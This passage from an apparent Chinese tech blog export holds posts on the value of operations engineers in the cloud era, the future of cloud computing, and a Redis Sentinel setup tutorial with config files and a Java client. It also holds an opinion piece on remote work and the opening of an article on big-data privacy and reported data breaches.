接口就可以批量创建，确实是方便了很多，但是这样一来，运维人员的价值在哪里体现呢？很多人做了一段时间运维发现没有什么成就感，有人就喊出了“在云时代，运维人已经没必要存在了”。 其实，我身边也有很多朋友跟我说过类似的话，我一个从事运维工作七八年的朋友跟我诉苦说干运维“背锅有份，加薪无缘”。但是我认为在未来，运维岗位就算被取代，运维服务也仍然会继续存在，并且会一直支撑着一个企业业务发展的完整生命周期。在云时代，运维人员要体现出来的价值除了技术能力还有运维管理能力。一般的运维工程师特别讲究广度而忽略深度，尤其云计算时代这个特点会更加被放大，运维工程师在工作中可能会使用到各种服务，例如操作系统、监控报警服务、日志收集服务、web 服务、负载均衡、各种数据库服务等等。但是每个服务他们可能只是停留在使用层面，对于背后的原理了解甚少。 以 Linux 操作系统为例，我相信做运维的人都了解过红帽的认证考试，例如 RHCE 这样的认证，里面会学 Linux的一些基础知识、网络协议、SHELL 脚本以及各种服务，例如 Apache、nginx、mysql、ftp等这些服务的搭建和配置。总是，似乎什么都需要了解，但是也仅仅是停留在一些基础的层面认知上。 我给单位做面试的时候面过一些持有类似 RCHE 这样的认证的候选人，我会发现这些同学都考了 RHCE 这样的证书，但是其实他们对于真正的一些细节性的问题根本答不上来。比如文件描述符是什么？，为什么 ftp 以及 http 协议不安全？那如何让它变得更安全呢？为什么？，什么是 OOM？等等，我大概也了解了现在的一个培训市场，很多培训机构只是为了应付考证，大多数同学都是靠背题库或答案靠上的证书，拿到了证书就觉得自己是个中级运维工程师了。 我们假设这些同学是认认真真的学会了整个认证体系中的所有知识点，都完全掌握和消化了，那其实在目前的市场上他也只是一个初级工程师，薪资并不会太高，因为很多企业他并不会说你学的所有技术他都能用到，可能只是使用到其中的一些非常少量的软件和服务，那么你是不是对这些软件和服务的熟悉程度完全大于你在培训时学过的呢，举个例子，以 Linux 为例，从初级到高级，以下是我自己对于各个级别的水平定义： 初级运维，掌握 Linux 的基本命令、用户管理、权限管理、进程管理、网络的基本管理（例如分配个 IP或 DNS)能够理解管道、文件描述符等概念以及各种服务，例如 Apache、FTP 等服务的搭建和基本配置，但是对于为什么这么配并不理解。能够编写一些基本的 SHELL 脚本,熟悉各种系统配置文件的含义和修改。 这个阶段的可能适合一些机房 IDC 运维和云计算的初级运维之类的角色，薪资大概不会超过 5k，一二线城市不会超过 8k，如果要提升薪资待遇，需要先达到中高级水平。 中高级运维， 在这个阶段，要深入的去理解一直两个服务的背后原理和使用方法，要做到知其然且知其所以然，把一些重要的技术给他吃透了，说实话，目前很多企业都缺少优秀的运维人员，那种什么都会，但是只会些皮毛的运维人员并不吃香。待遇自然上不去。也就只能停留在干一些初级的运维工作上了。 首先，这个阶段的运维工程师要掌握初级所需知识栈且编程能力强，那其实现在有了云服务，鼠标点点就可以创建一台服务器，那么对于以前那种使PXE 等技术批量化部署系统的能力就稍微了解下就好，知道工作原理，但是云时代要拥有较强的编程能力，能够实现一些自动化工具，能够使用云厂商提供的 API 接口来实现各种自动化管理的平台或脚本。如果有很多台服务器，类似Ansible这样的工具要重点掌握其使用，能够独立编写 Playbook 等能力。而且重点培养自己的编程能力，学会一到 2 门编程语言，例如 Python 或 Go 等。 其次，对于某一些服务达到深入理解底层原理的程度，比如 nginx，初级的可能仅仅只是停留在表面的配置，知道为什么这么配置，但是并不知道如果这么配置会带来哪些影响，因为在很多时候，一个简单的配置可能会引起其他关联服务的不正常运行，举个例子，比如 nginx 中如果你配置了 gzip_vary 对文件进行压缩，初级的运维工程师可能知道这个功能好，哪里好呢？他能够给一些文件进行压缩节省带宽提升传输效率，但是在一些场景下可能就因为这个功能的开启就导致关联服务不能正常运行了，比如一些服务因为文件被压缩而无法解析文件。中级运维要能够快速的发现并解决这些疑难故障。，能够对于不同的业务场景进行系统或应用的优化，提升并发能力等。我认为，云计算时代，运维人员的工作变了，从搭建和配置各种服务中得以解放，把工作重心放在提升服务的稳定性和可靠性上，这就需要建立一整套行之有效的运维管理体系和流程才能够保证稳定性和可靠性。把复杂问题流程化，通过自动化平台或自动化工具来让运维工作变得更加智能和便捷，而不是像以前那么复杂，这是新时代运维的价值体现。运维价值的体现主要体现在以下几个方面： 质量，包括服务的可用性、和用户体验。 效率，包括发布的效率，扩缩容的效率。 安全，包括系统安全和网络安全以及数据安全。 成本，包括机器硬件的成本和网络带宽的成本以及人力的成本以及第三方服务的成本控制和运营成本的控制 流程，包括内部的各种业务发布、测试、变更流程以及各种权限和资源申请流程，其目的是为了保证效率和安全以及质量 技术，对于过时的技术的更新迭代、各种技术标准的制定。 举个例子，以这次微盟事件为例，微盟使用的是腾讯云，这其中各种权限和流程的漏洞如何在运维工作中把他扼杀在摇篮之中，这就是能够体现出运维人的工作价值。这不论是对于小公司还是大公司的运维都是一样的。运维人员存在的意义就在于能够为企业的业务发展保驾护航。 不管是当下还是未来，一个优秀的运维人都应该保持谦虚好学向上的态度，不卑不亢，保持自己的技术能力和业务能力能够紧跟着时代的发展，才不会被时代“杀死”和淘汰。","categories":[{"name":"云计算","slug":"云计算","permalink":"https://awen.me/categories/%E4%BA%91%E8%AE%A1%E7%AE%97/"}],"tags":[{"name":"运维 云计算","slug":"运维-云计算","permalink":"https://awen.me/tags/%E8%BF%90%E7%BB%B4-%E4%BA%91%E8%AE%A1%E7%AE%97/"}]},{"title":"云计算的未来是什么","slug":"云计算的未来是什么","date":"2020-03-21T01:24:59.000Z","updated":"2021-02-26T06:05:29.299Z","comments":true,"path":"posts/8ab8de82.html","link":"","permalink":"https://awen.me/posts/8ab8de82.html","excerpt":"","text":"一场突如其来的疫情使得很多人不得不宅在家里，这场疫情之中，很多线下实体店遭受了巨大的冲击，但是很多互联网企业却在这次疫情之中赚的盆满钵满。我们可以发现由于无法在办公室办公和会议，很多公司开始了远程办公和远程会议；由于医院人满为患，很多慢性病患者或轻症患者为了避免交叉感染选择了远程医疗问诊；由于学校停课，各地教育部要求学生在家远程直播上课，还有各种直播平台、视频分享平台、游戏等等业务都成为了此次疫情之中的最大赢家。这些服务虽然不同，但是其背后都需要依赖庞大的计算资源和网络带宽，云计算作为互联网的基础服务在这场疫情之中扮演者重要的角色，在互联网世界中，云计算就和水、电一样重要。 云计算的过去我们知道在过去如果你的业务想在互联网上为用户提供服务，是需要与运营商或有电信运营资格的企业手中租赁机柜和硬件服务器或自己提供服务器托管在数据中心(IDC）中，这种模式带来的弊端显而易见：首先，是硬件成本高，一台服务器成本高达几万元加上托管费和网络费用等等，一些中小企业承受不起如此昂贵的支出，其次，是利用率不高，一台服务器如果只运行一个服务，可能资源利用率不到 10%，但是如果把很多服务都跑在同一台服务器上，虽然可以提升服务器的资源利用率，但是一旦服务器出现故障，所有的进程都会挂掉，缺乏高可用能力。第三，可扩展性低，维护成本过高，传统的 IDC 托管方式，一台服务器要升级硬件是非常的耗费人力和时间的，你可以想象以下一台服务器出现硬件故障或要增加磁盘，运维人员需要从公司跑到机房去升级硬件，这中间需要停机断电升级。后来一些服务器进行升级支持热插拔技术，但是也还是需要有人去机房升级或者有的机房，这种方式的可扩展性和维护成本之高是一些中小企业无法承受的。因此，在2006年云计算这个概念被首次提出，从概念到产品一直不断的迭代发展到今天，已经差不多10年了。在这10年间，云计算取得了飞速的发展与翻天覆地的变化。如今我们可以看到云计算被视为计算机网络领域的一次革命，因为它的出现，社会的工作方式和商业模式也在发生巨大的改变。与此同时也诞生出一批优秀的先行者和行业领导者，例如谷歌、微软、亚马逊、阿里云等等一批优秀的云计算提供商。当然这背后离不开那些为此而付出的开源软件厂商和优秀的开发者门，例如 OpenStack、docker、kubernetes 等等技术的产生使得云计算日渐成熟。现如今，我们通过云厂商们提供的平台可以使用非常方便的购买硬件资源进行使用，云计算给我们带来的便利性如下： 按需付费，用户可以根据自己的业务需求购买适合自己当前业务规模的硬件资源进行使用。 弹性伸缩，通过鼠标点点就可以升级和降级硬件资源，灵活性非常强。 可靠性高，由于购买资源的成本大大降低，部署高可用等技术成为了可能，这使得倘若服务器故障也不影响计算与应用的正常运行。 云计算的服务类型也多种多样，通常我们分为Iaas、Pass、SaaS。 基础设施即服务IaaS)基础设施即服务是主要的服务类别之一，它向云计算提供商的个人或组织提供虚拟化计算资源，如虚拟机、存储、网络和操作系统。平台即服务(PaaS)由于 Iaas 的蓬勃发展，为 Pass 服务提供了可能，它能够为开发人员提供通过全球互联网构建应用程序和服务的平台。Paas为开发、测试和管理软件应用程序提供按需开发环境。软件即服务(SaaS)软件即服务也是其服务的一类，通过互联网提供按需软件付费应用程序，云计算提供商托管和管理软件应用程序，并允许其用户连接到应用程序并通过全球互联网访问应用程序。事实上，我们会发现很多云厂商提供的服务类型都是基于 Iaas、PaaS和 SaaS 之和的。 云计算的未来随着云计算的继续发展，未来在云基础设施、云开发、云应用、云管理四个方面都将会出现更多的服务和产品形态。首先是基础服务设施的发展，据 IDC于近日发布了《IDC FutureScape: 全球云计算2020 年预测——中国启示》到2021年，中国90%以上的企业将依赖于本地/专属私有云、多个公有云和遗留平台的组合，以满足其基础设施需求。因此分布式云将会成为未来基础设置发展的一个重要方向。第二是云开发的发展，随着更多的企业上云，依赖云提供的各种API生态将会蓬勃发展，我们可以看到类似阿里云、AWS 这样的基础设置领导者正在不断的完善他们的 API 接口供使用者调用。其实在当下，我们就可以通过这些服务提供商提供的 API 接口来对一些云服务提供生命周期管理。在未来还会有更多的产品和服务将使用公有云和内部API提供的服务构建复合型应用程序；据 IDC 预测，其中将有一半将利用人工智能和机器学。第三个是云应用的发展，未来人工智能自动化、物联网和智能设备每天将产生庞大的数据，这将导致一些行业应用规模化从而驱动很多业务提供商通过云来为客户提供应用，即会出现各种丰富多样的PaaS 平台，比如医疗、教育、电商等等 PaaS 平台。第四个是云管理的发展，随着虚拟化技术和容器以及容器编排技术的发展，以 Kubernetes和多云管理流程以及各种自动化运维工具的出现，未来到将会有更多的企业将在容器、开源和云原生应用开发方面依赖于第三方服务提供商的帮助来构建和管理他们的业务。 我们可以看到云计算在这 10 几年时间里从互联网走向非互联网，从传统的服务升级方式走向云原生，从影响企业IT变革走向推动企业全面数字化转型，正深刻地影响着个人、企业乃至整个社会的生产生活方式。","categories":[{"name":"云计算","slug":"云计算","permalink":"https://awen.me/categories/%E4%BA%91%E8%AE%A1%E7%AE%97/"}],"tags":[{"name":"云计算","slug":"云计算","permalink":"https://awen.me/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"}]},{"title":"一文搞懂哨兵","slug":"一文搞懂哨兵","date":"2020-03-20T12:39:01.000Z","updated":"2021-02-26T06:05:29.295Z","comments":true,"path":"posts/56799160.html","link":"","permalink":"https://awen.me/posts/56799160.html","excerpt":"","text":"众所周知，Redis 由于其利用内存来存储数据，且支持非常丰富的数据结构，包括字符串、列表、集合、甚至地理位置信息(GEO)等等，被广泛应用在各种在各个领域实现缓存功能。但是在实际的生产环境中，要希望发挥Redis 的缓存功能，保障业务的正常运行，高可用是一个绕不开的话题。今天我们就来讨论下Redis 的高可用实现方案——哨兵。 在介绍哨兵之前，我们需要先了解下 Redis 的主从复制模式，Redis 的主从复制模式是为了解决在分布式系统中出现的单点问题，通过把数据复制多个副本部署到多台机器上，从而实现满足故障恢复和负载均衡等需求。但是这种复制模式一旦主节点出现故障无法提供服务，需要人工介入手工将从节点调整为主节点，同时应用端还需要修改新的主节点地址。 如图所示，主节点无法正常启动，需要选出一个从节点 （slave-1），对其执行slaveof no one命令使其成为新的主节点，即原来的从节点（slave-1）成为新的主节点后，更新应用方的主节点信息，重新启动应用方。 这种人工介入的故障转移方式对于需要高可用的业务应用场景是不能容忍的。因此 Redis 提供了一种更为可靠的方式，即哨兵。 什么是哨兵Redis 哨兵 (Sentinel) 是一个分布式的架构，其自身也是一个独立的 Redis 节点，只不过不存储数据且只支持部分命令，它能够自动完成故障发现和故障转移，并通知应用方，从而实现高可用。 Redis Sentinel 包含了若干 Sentinel 节点和 Redis 数据节点，每个 Sentinel 节点会对数据节点和其他 Sentinel 节点进行监控，当发现节点异常时，会对节点做下线标识，如果被标识的是主节点，此时会与其他Sentinel 节点进行协商，当大多数Sentinel 节点都人为主节点不可达时候，会发起选举，选出一个 Sentinel 节点来完成自动故障转移的工作，同时会将这个变化通知给 Redis 的应用方。这个过程是完全自动化的，无需人工干预。 哨兵主要提供一下几个功能： Sentinel 主要提供以下几个功能： 监控。Sentinel会不断检查您的主实例和副本实例是否按预期工作。 通知。Sentinel可以通过API通知系统管理员或其他计算机程序，其中一个受监视的Redis实例出了问题。 自动故障转移。如果主服务器未按预期工作，则Sentinel可以启动故障转移过程，在该过程中将副本升级为主服务器，将其他附加副本重新配置为使用新的主服务器，并通知使用Redis服务器的应用程序要使用的新地址。连接时。 配置提供程序。Sentinel充当客户端服务发现的授权来源：客户端连接到Sentinels，以询问负责给定服务的当前Redis主服务器的地址。如果发生故障转移，Sentinels将报告新地址。 搭建哨兵Sentinel 在最新的版本中使用的版本是 Sentinel 2。其使用更强大且更容易预测的算法对Sentinel初始实现进行的重写。 在搭建哨兵之前，需要掌握一些基本常识： 一个高可用的哨兵集群需要至少3个Sentinel实例。 需要将三个Sentinel实例放置到被认为以独立方式发生故障的计算机或虚拟机中。换句话说就是部署在不同的机器上。 Sentinel + Redis分布式系统不保证在故障期间保留已确认的写入，因为Redis使用异步复制。 使用容器或其他形式的网络地址转换或端口映射时要注意，例如Docker执行端口重新映射会破坏Sentinel对其他Sentinel进程的自动发现以及主副本的列表。 为什么需要至少3个Sentinel 实现哨兵？ 因为多个 Sentinel 节点来共同判断故障，可以有效防止误判，同时如果个别 Sentinel 节点不可用，整个 Sentinel 节点集合依然是高可用的。 哨兵的部署分为： 部署数据节点 部署Sentinel 如图所示 部署数据节点1.创建一个 文件名为 redis-6379.conf 的文件，其内容如下 123456789port 6379 daemonize yes logfile &quot;6379.log&quot; dbfilename &quot;dump-6379.rdb&quot; dir &quot;&#x2F;opt&#x2F;soft&#x2F;redis&#x2F;data&#x2F;&quot; 然后启动 1redis-server redis-6379.conf 并测试是否可以正常连接 1$ redis-cli -h 127.0.0.1 -p 6379 ping PONG 2.复制上述文件，并修改文件名以及文件内容中的端口号为 6380和8381，以上述同样的方式创建并启动另外2个数据节点，如下所示，注意这2个从节点最后一行配置与主节点不一样。 redis-6380.conf 12345678910port 6380daemonize yes logfile &quot;6380.log&quot; dbfilename &quot;dump-6380.rdb&quot; dir &quot;&#x2F;opt&#x2F;soft&#x2F;redis&#x2F;data&#x2F;&quot;slaveof 127.0.0.1 6379 redis-6381.conf 12345678910port 6381daemonize yes logfile &quot;6381.log&quot; dbfilename &quot;dump-6381.rdb&quot; dir &quot;&#x2F;opt&#x2F;soft&#x2F;redis&#x2F;data&#x2F;&quot; slaveof 127.0.0.1 6379 3.当主从搭建完成后，使用如下命令确认主从关系是否正常 1redis-cli -h 127.0.0.1 -p 6379 info replication 部署sentinel 节点1.创建一个文件名为redis-sentinel-26379.conf 的文件，Sentinels默认情况下会监听TCP端口26379的连接。 12345678port 26379daemonize yeslogfile &quot;26379.log&quot; dir &#x2F;opt&#x2F;soft&#x2F;redis&#x2F;data sentinel monitor mymaster 127.0.0.1 6379 2 sentinel down-after-milliseconds mymaster 30000 sentinel parallel-syncs mymaster 1 sentinel failover-timeout mymaster 180000 配置文件说明： Sentinel节点的默认端口是 26379。 sentinel monitor mymaster 127.0.0.163792 配置代表 sentinel-1节点需要监控127.0.0.1：6379 这个主节点，2代表判断主节点失败至少需要2个 Sentinel 节 点同意，mymaster 是主节点的别名。其配置为 sentinel monitor ，quorum 表示要判断主节点最终不可达所需要的票数。同时这个参数还与选举领导者有关，至少需要max(quorum,num/2+1)个节点参与选举，才能选出领导者 sentinel，从而完成故障转移。比如总共有 5 个 sentinel 节点，quorum =4 ，name 至少需要 4 个sentinel 节点才可以进行领导者的选举。 sentinel down-after-milliseconds 表示每个 sentinel 节点都要定期发送 ping 命令来判断 redis 数据节点和其他 sentinel 节点是否可达，如果超过了down-after-milliseconds 配置的时间且没有有效回复，则判断节点不可达。times 单位是毫秒。down-after-milliseconds虽然以为参数，但实际上对 Sentinel节点、主节点、从节点的失败判定同时有效。 sentinel parallel-syncs 当Sentinel节点集合对主节点故障判定达成一致时，Sentinel领导者节点会做故障转移操作，选出新的主节点，原来的从节点会向新的主节点发起复制操作，parallel-syncs 就是用来限制在一次故障转移之后，每次向新的主节点发起复制操作的从节点个数。如果这个参数配置的比较大，那么多个从节 点会向新的主节点同时发起复制操作，尽管复制操作通常不会阻塞主节点， 但是同时向主节点发起复制，必然会对主节点所在的机器造成一定的网络和 磁盘IO开销。 sentinel failover-timeout failover-timeout通常被解释成故障转移超时时间，但实际上它作用于故障转移的各个阶段: a) 选出合适从节点。 b) 晋升选出的从节点为主节点。 c) 命令其余从节点复制新的主节点。 d) 等待原主节点恢复后命令它去复制新的主节点。 failover-timeout的作用具体体现在四个方面: 如果Redis Sentinel对一个主节点故障转移失败，那么下次再对该主节点做故障转移的起始时间是failover-timeout的2倍。 在b)阶段时，如果Sentinel节点向a)阶段选出来的从节点执行slaveof no one一直失败(例如该从节点此时出现故障)，当此过程超过 failover-timeout时，则故障转移失败。 在b)阶段如果执行成功，Sentinel节点还会执行info命令来确认a)阶段选出来的节点确实晋升为主节点，如果此过程执行时间超过failover- timeout时，则故障转移失败。 如果c)阶段执行时间超过了failover-timeout(不包含复制时间)， 则故障转移失败。注意即使超过了这个时间，Sentinel节点也会最终配置从 节点去同步最新的主节点。 2.启动节点 1redis-sentinel redis-sentinel-26379.conf 确认sentinel 是否正常,Sentinel节点本质上是一个特殊的Redis节点，所以也可以通过info命令来查询它的相关信息，从下面info的Sentinel片段来看 1redis-cli -h 127.0.0.1 -p 26379 info Sentinel 4.然后使用使用上面的配置文件，创建redis-sentinel-26380.conf 和redis-sentinel-26381.conf ，其配置文件内容如下: redis-sentinel-26380.conf 12345678port 26380daemonize yeslogfile &quot;26380.log&quot; dir &#x2F;opt&#x2F;soft&#x2F;redis&#x2F;data sentinel monitor mymaster 127.0.0.1 6379 2 sentinel down-after-milliseconds mymaster 30000 sentinel parallel-syncs mymaster 1 sentinel failover-timeout mymaster 180000 redis-sentinel-26381.conf 12345678port 26381daemonize yeslogfile &quot;26381.log&quot; dir &#x2F;opt&#x2F;soft&#x2F;redis&#x2F;data sentinel monitor mymaster 127.0.0.1 6379 2 sentinel down-after-milliseconds mymaster 30000 sentinel parallel-syncs mymaster 1 sentinel failover-timeout mymaster 180000 当三个sentinel 节点启动后，配置文件中的内容发生了变化： Sentinel节点自动发现了从节点、其余Sentinel节点。 去掉了默认配置，例如parallel-syncs、failover-timeout参数。 添加了配置纪元相关参数。 Sentinel 的三个定时监控任务： 每隔 10 秒向主节点和从节点发送 info 命令获取最新的拓扑。 每隔 2 秒，每个 sentinel 节点会向数据节点的_sentinel_:hello频道发送该 sentinel 节点对于主节点的判断以及当前 sentinel 节点信息，同时每个 sentinel 节点也会订阅该频道，来了解其他 sentinel 节点以及他们对主节点的判断。 每个 1 秒，每个 sentinel 节点会向主节点、从节点、其他 sentinel 节点发送一条 ping 命令做一次心跳检测，判断节点是否存活。 哨兵的下线哨兵的主观和客观下线 主观下线：当节点超过 down-after-milliseconds 没有进行有效回复，就会判定该节点失败，这叫主观下线。 客观下线: 当Sentinel主观下线的节点是主节点时，该Sentinel节点会通过sentinel is- master-down-by-addr命令向其他Sentinel节点询问对主节点的判断，当超过 个数，Sentinel节点认为主节点确实有问题，这时该Sentinel节点会 做出客观下线的决定。 哨兵的选举哨兵的选举过程如下： 每个在线的Sentinel节点都有资格成为领导者，当它确认主节点主观下线时候，会向其他Sentinel节点发送sentinel is-master-down-by-addr命令， 要求将自己设置为领导者。 收到命令的Sentinel节点，如果没有同意过其他Sentinel节点的sentinel is-master-down-by-addr命令，将同意该请求，否则拒绝。 如果该Sentinel节点发现自己的票数已经大于等于max(quorum， num(sentinels)/2+1)，那么它将成为领导者。 如果此过程没有选举出领导者，将进入下一次选举。 领导者选举的过程非常快，基本上谁先完成客观下线，谁就是领导者。 如何进行故障转移故障转移，在从节点列表中选出一个节点作为新的主节点，选择方法如下: 过滤:“不健康”(主观下线、断线)、5秒内没有回复过Sentinel节 点ping响应、与主节点失联超过down-after-milliseconds*10秒。 选择slave-priority(从节点优先级)最高的从节点列表，如果存在返回，不存在则继续。 选择复制偏移量最大的从节点(复制的最完整)，如果存在则返回，不存在则继续。 选择runid最小的从节点。 客户端连接以Java 为例，可以通过 sentinels.add 添加多个sentinel 节点，代码如下： 1234567891011121314151617181920public class RedisSentinelClient &#123; public static void main(String[] args) &#123; Set sentinels &#x3D; new HashSet(); sentinels.add(new HostAndPort(&quot;10.12.37.71&quot;, 26379).toString()); sentinels.add(new HostAndPort(&quot;10.12.37.72&quot;, 26380).toString()); sentinels.add(new HostAndPort(&quot;10.12.37.73&quot;, 26381).toString()); JedisSentinelPool sentinelPool &#x3D; new JedisSentinelPool(&quot;mymaster&quot;, sentinels); System.out.println(&quot;Current master: &quot; + sentinelPool.getCurrentHostMaster().toString()); Jedis master &#x3D; sentinelPool.getResource(); master.set(&quot;username&quot;,“csdn&quot;); sentinelPool.returnResource(master); Jedis master2 &#x3D; sentinelPool.getResource(); String value &#x3D; master2.get(&quot;username&quot;); System.out.println(&quot;username: &quot; + value); master2.close(); sentinelPool.destroy(); &#125;&#125; 好了，以上就是关于redis 哨兵的相关介绍。","categories":[{"name":"redis","slug":"redis","permalink":"https://awen.me/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://awen.me/tags/redis/"}]},{"title":"远程办公终将是昙花一现","slug":"远程办公终将是昙花一现","date":"2020-03-20T12:38:07.000Z","updated":"2021-02-26T06:05:29.359Z","comments":true,"path":"posts/7b9b6dfd.html","link":"","permalink":"https://awen.me/posts/7b9b6dfd.html","excerpt":"","text":"2020 年2月3号开始，很多互联网企业都开始了远程办公，很多程序员或者从事互联网相关工作的朋友可能很早都想过SOHO或远程办公，远程办公有很多的优势，但是我认为远程办公只是一种无奈的妥协方案，不会长久下去，这场集体狂欢终将在这场役情结束之后回归正轨。 远程办公的优势远程办公有很多的优势，我这里从员工和企业两个层面来探讨下。 首先，从员工角度来看，最直接的好处就是省去了上下班往返公司的时间，员工通过远程办公，不需要挤公交、地铁或自驾往返在去公司和回家的路程，省去了很多通勤时间。 以我自己为例，我在杭州滨江某厂上班，因为一些原因住在未来科技城这边，上班在滨江，中间隔着30公里的路，每天往返就是60公里，一趟大概需要60多分钟。早上7点20出发，9点到公司，如果遇上下雨天或交通故障以及其他交通管制，这个时间还会更长，杭州目前的交通本来就很差，很多地方地铁都没开通或在建。每天2个多小时在路上，一年就浪费了将近800 个小时。人的精力是有限的，这样的通勤消耗会使得整个人的状态都会差很多。我还有的同事住的更远，一趟就需要60多公里，无奈之下他只能选择在公司附近租房，而这样一来一个月也是需要几千块的开支。因此，远程办公可以省下很多的通勤时间和交通费用以及房租。 其次，远程办公给员工带来了空间与灵活，员工可可以住在自己想住的地方，可以和家人在一起，还有可能去一个他就是喜欢呆的地方。 那么从企业的角度来看，企业可以省区了租金、物业费、空调费、装修费、水电费，而且由于不受地区限制，可以招聘更多地区的优秀人才加盟。 按理来说远程办公这么多优势远程工作应该大力推广，据人力资源服务公司Kelly Services的全球劳动力指数（KGWI）调研显示：在全球范围内，有超过四分之一的受访者（29%）表示，每周至少有部分时间采取远程办公的方式。 从来自美洲、欧洲、中东、非洲和亚太约12.2万名受访者的回应来看，远程办公至少在亚太地区已渐成趋势。 “在我熟悉和所在的知识服务行业，我已经感受到中国地区远程办公这一趋势。”来自AC尼尔森大中华地区的资深总监徐欣在接受《第一财经日报》采访时表示。尼尔森就已经有相当比例的员工实行远程办公。 事实上，我们所熟悉的很多开源软件，例如Linux，kubernetes以及GitHub上各种优秀的开源软件，他们的开发者几乎都是分布在全球不同国家和地区的。似乎远程工作的方式应该也理所应当已成为一种趋势。 2015年，斯坦福大学教授尼古拉斯·布鲁姆（Nicholas Bloom）曾联合携程公司，进行过为期九个月的在家工作的社会实验，结果表明，相比于在办公室办公，在家工作的员工不仅绩效大幅上升，离职率也大幅下降。 国内远程办公还处于初级阶段但是，理想很丰满，现实却很骨感。事实上，国内很多公司远程办公发展还是相对滞后的。 首先，支持远程办公的公司数量不多，企业实施远程办公的动力不足，是因为很多地方政府需要招商引资，会给予这些企业补贴，企业拿到补贴后必然需要这些企业设立办公地点在当地并招聘人才，地方政从企业的盈利中获得税收支持地方的政府发展，所以近几年来，我们也都看到，很多地方加大力度吸引优秀人才落户，为此投入了大量的人力和补贴。现在不仅仅是各个城市之间抢夺人才，甚至各个城市之间的区都在抢夺人才，而这些人才会在当地找工作、落户、买房、生活从而为当地的城市建设带来发展，城市发展了就会增加各种配套设施，发展好的城市由于其优秀的医疗、教育等资源会更加吸引大量优秀的人才，因此我们看到很多优秀的人才都在往一二线城市聚集，因此这些地方企业根本不愁招不到优秀的人才，因为他们眼下就是全国最好的人才。而如果实施远程办公，这些人才可以自由选择自己喜欢的地方办公，这样就会分散在各个地方，那么地方政府就没有办法把这些人才进行聚集，就无法推动当地的各项经济发展。 对于企业而言远程办公，其实是也不利于企业管理这些人才。首先是支持远程办公的工具不够完善，其次是实施远程办公，无法量化员工的个人工作态度和成果。 首先，是支持远程办公的工具不够完善，虽然目前市面上出现了一些协同办公的软件，例如钉钉、企业微信、tower、谷歌文档、微软office 、wps文档、以及一些可以实现访问企业内网资源的VPN产品，可以一定程度上满足企业远程办公的需求，但是一些企业出于信息安全考虑，不可能将自己的所有内部资料通过这些公共的产品上进行传输，其次这些协同工作方式严重依赖电力、网络，试想一下如果你在家办公，正在远程会议突然停电或网络延迟卡顿，这种情况是非常影响会议质量的。而一些岗位其实并不适合远程方式沟通，不如当面沟通更直观和便捷，比如开发、产品、测试，此外，远程办公会失去在现场与同事/主管协作和联络的机会，无法实现整个团队的凝聚力。 第二，就是远程办公无法量化员工的个人工作态度和成果，在办公室办公主管可以清楚的看到这个员工是否认真工作，是否加班，而远程办公，哪怕这个员工在床上躺着你也不知道。换句话说远程办公非常考验个人的时间管理和自律。而员工长时间远程办公也无法区分工作和生活。很多的员工是为了工作而工作，不是真的喜欢工作，属于外驱状态，缺乏职业素养，因此远程办公不利于事务的驱动，作为规则制定者，雇主当然不希望如此，而哪怕你严格的管理自己的工作和时间，由于人性天然的不信任，不安全感，远程的方式远不如当面来的亲切，加上企业之间竞争压力大，远程办公需要有优秀的项目管理能力，一般中小企业的雇主处于各种压力不会推广远程办公。 第三，由于远程的方式工作，没办法频繁见面或者经常进行团建，导致了团队成员获得公司信息和参与团队活动的机会减少，对公司的归属感可能更低。 最后，从成本角度考虑，国内的人力成本远比国外低。除了少数核心岗位，大部分岗位的工资水平也仅仅是刚刚够养家糊口的水平。远不如国外。 部分互联网公司早已实施远程办公事实上，很多互联网公司在这场集体远程办公之前早已开始了远程工作，以我所在的团队为例，很多开发、运维、支持人员几乎每天下班回家或是周末都在家办公，但是这仅仅是短暂的临时处理问题的远程工作方式、且只是部分岗位，并不是像现在这样这么长时间的远程工作。 在此次疫情中，网易已经实现了无接触招聘，即在线申请、远程面试、电子签约、远程入职、远程办公等招聘手段。 但是我仍然认为远程办公只是一种无奈的妥协方案，不会长久下去，在这场集体狂欢终将在这场役情结束之后回归正轨。国内的远程办公之路还有很长的路需要走。但是我相信在不久的将来，一定可以有更加完善的解决方案来实现大多数岗位远程工作。","categories":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"大数据时代，如何找回隐私权","slug":"大数据时代，如何找回隐私权","date":"2020-03-20T12:31:17.000Z","updated":"2021-02-26T06:05:29.323Z","comments":true,"path":"posts/bf6da899.html","link":"","permalink":"https://awen.me/posts/bf6da899.html","excerpt":"","text":"随着互联网、传感器以及各种数字化终端设备的普及，一个万物互联的世界正在成型。尤其是以智能手机为首的终端设备普及使得人们的社交生活彻底数字化，人们每天在社交网络上花费的时间越来越多，产生的数据量也相应地不断增长。据IDC发布《数据时代2025》的报告显示，全球每年产生的数据将从2018年的33ZB增长到175ZB，相当于每天产生491EB的数据。我们正处在一个大数据时代，每天大量涉及个人隐私、财产信息和行为轨迹的数据在互联网上存储和传输，保护数据安全的重要性不言而喻。然而，近年来，大规模数据泄露事件层出不穷，不断引发社会各界对网络安全的担忧。 日前 Comparitech 的安全员 Bob Diachenko发布报告称，自己在某个出现在网络上的数据库中发现了超过 2.67 亿个 Facebook 用户的 ID、姓名和电话号码信息。据说该数据库无需密码或认证即可进入，其暴露在网上的时间已有两周之久，而且期间亦有人将其中的数据做成下载内容放到了骇客论坛上。在发现数据库后，Diachenko 向管理其服务器 IP 地址的服务供应商报告了情况。同时他也推测数据库中的信息很有可能是被非法抓取，亦或是有人在滥用 Facebook 的 API。 这已经不是 Facebook 第一次被爆数据被泄露了，今年3月21日，外媒报道，约有2亿至6亿Facebook用户的密码以纯文本方式储存。这些包含纯文本用户密码的数据元素被数千名Facebook 工程师或开发人员访问了约 900 万次，而且这些数据还能被2万多名Facebook员工搜索到。 当然这种数据泄露的问题国内外都会存在，2018年6月16日，有人在暗网开始叫卖招聘网站前程无忧(51job.com)用户信息，其中涉及195万用户求职简历，随后前程无忧方面确认部分用户账户密码被撞库。 2018年6月19日，有人公然在暗网上兜售圆通10亿条快递数据，这引发了外界的广泛关注，按照卖家的说法，这些数据是2014年下旬的数据，数据信息包括寄(收)件人姓名，电话，地址等信息，都是圆通内部人士批量出售而来(只要快递单信息进入电脑他们就可以获取)。 